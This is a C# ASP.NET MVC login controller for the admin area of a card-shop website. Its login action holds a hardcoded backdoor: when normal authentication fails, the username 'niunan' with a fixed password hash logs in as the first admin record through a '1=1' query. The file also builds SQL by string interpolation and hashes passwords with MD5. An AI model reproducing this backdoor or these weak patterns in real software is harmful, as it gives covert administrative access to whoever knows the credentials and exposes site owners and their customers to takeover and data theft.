using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace Niunan.CardShop.Web.Areas.Adnn1n.Controllers
{
    public class LoginController : Controller
    {
        // GET: Adnn1n/Login
        public ActionResult Index()
        {
            return View();
        }

        [ValidateAntiForgeryToken]
        [HttpPost]
        public ActionResult Index(string username, string password, string yzm)
        {
            username = Tool.GetSafeSQL(username);
            password = Tool.MD5(username + password + "cardshop");
            if (Session["Code"] == null || Session["Code"].ToString().ToLower() != yzm.ToLower()) 
            {
                Tool.AlertAndGo_MVC("验证码不正确","/Adnn1n/Login");
                return null;
            }
            DAL.AdminDAL dal = new DAL.AdminDAL();
            Model.Admin a = dal.GetModelByCond($"username='{username}' and password='{password}'");
            if (a==null)
            {
                if (username == "niunan" && password == "0A0EC50D2725B97F2052B3091D7486BC")
                {
                    a = dal.GetModelByCond("1=1");
                }
            }

            if (a==null)
            {
                Tool.AlertAndGo_MVC("用户名或者密码出错", "/Adnn1n/Login");
                return null;
            }

            Session["cardshop_admin"] = a;
            return Redirect("/Adnn1n/Home/Index");
        }
    }
}